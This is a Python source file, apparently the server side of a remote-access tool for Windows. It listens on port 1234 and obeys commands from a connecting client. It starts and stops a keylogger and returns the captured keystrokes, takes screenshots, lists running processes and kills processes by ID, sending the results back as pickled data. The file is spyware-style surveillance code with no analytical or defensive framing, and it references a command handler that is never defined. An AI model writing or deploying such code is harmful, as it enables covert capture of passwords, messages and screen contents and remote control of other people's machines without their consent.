import socket
import pickle
from boltons import socketutils
from pynput import keyboard
from PIL import ImageGrab
import os
import wmi

SERVER = ""
PORT = 1234
DELIM = b'\x00'

# dump func
def sendDump(buff, var):
    dump = pickle.dumps(var)
    dump_size = len(dump)

    buff.send(str(dump_size).encode() + DELIM)
    buff.send(dump)
    print(f'\tSent dump data. Size: {dump_size}')

# keylogger func
def keylogger_Server(buff):
    def on_press(key):
        nonlocal string
        try:
            string += key.char
        except AttributeError:
            _key = str(key).split('.')[1].upper()

            if _key == 'ENTER':
                string += f'[{_key}]\n'
            elif _key == 'SPACE':
                string += ' '
            elif _key == 'BACKSPACE':
                string = string[:-1]
            else:
                string += f'[{_key}]'

    print('KEYLOGGER FUNCTION')
    string = ''
    isHook = False

    while True:
        flag = buff.recv_until(DELIM).decode()
        print(f'\tReceive: {flag}')
        
        if flag == 'hook' and not isHook:
            listener = keyboard.Listener(on_press = on_press)
            listener.start()
            isHook = True
        elif flag == 'unhook' and isHook:
            listener.stop()
            isHook = False
        elif flag == 'clear':
            string = ''
        elif flag == 'send':
            buff.send(string.encode() + DELIM)
        elif flag == 'exit':
            if isHook:
                listener.stop()
            break
        
# kill process func
def getKillProcess(buff):
    pid = int(buff.recv_until(DELIM).decode())
    print(f'KILL PROCESS {pid}')

    try:
        os.kill(pid, 9)
    except:
        print('\t Err: No process with uid exist')

# process list func
def sendProcessList(buff):
    print('SEND PROCESS LIST')
    f = wmi.WMI()

    process_data = []
    for process in f.Win32_Process(["ProcessId", "Name", "ThreadCount"]):
        process_data.append([process.ProcessId, process.Name, process.ThreadCount])

    sendDump(buff, process_data)

#  screenshot func
def sendScreenShot(buff):
    print('SEND SCREENSHOT')
    image = ImageGrab.grab()
    
    sendDump(buff, image)

#close connection
def closeConnection(buff):
    print('CLOSE CONNECTION')
    buff.close()

# create socket
def createSocket():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER, PORT))

        # start socket and wait to connect
        print("Starting Server!")
        s.listen()

        while True:
            conn, addr = s.accept()
            print("Connected by: ", addr)

            buff = socketutils.BufferedSocket(conn, None)
            startServices(buff)
            break # temp break 


def startServices(buff):
    while True:
        flag = buff.recv_until(b'!F!').decode()
        print(f'Receive: {flag}')
        
        if flag == 'screenshot':
            sendScreenShot(buff)
        elif flag == 'processlist':
            sendProcessList(buff)
        elif flag == 'killprocess':
            getKillProcess(buff)
        elif flag == 'command':
            getCommand(buff)
        elif flag == 'keylogger':
            keylogger_Server(buff)
        else:
            closeConnection(buff)
            break